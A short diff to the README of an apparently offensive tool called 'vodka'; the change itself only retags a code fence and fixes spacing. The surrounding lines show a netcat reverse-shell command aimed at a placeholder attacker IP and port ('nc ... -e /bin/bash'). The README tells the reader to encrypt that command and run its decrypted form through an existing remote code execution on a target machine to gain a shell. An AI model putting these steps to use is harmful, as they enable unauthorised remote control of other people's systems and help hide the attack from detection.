@@ -45,9 +45,9 @@ vodka encrypt "nc [attacker_ip] [attacker_port] -e /bin/bash"
 ```
 
 Copy encrypted command and executed it with your rce **on target machine**
-```
+```shell
 ./vodka decrypt [encrypted_command]
-##Now you have a bindshell shell, spawn it to make it interactive and use vodka normally)
+## Now you have a bindshell shell, spawn it to make it interactive and use vodka normally)
 
 ```
 
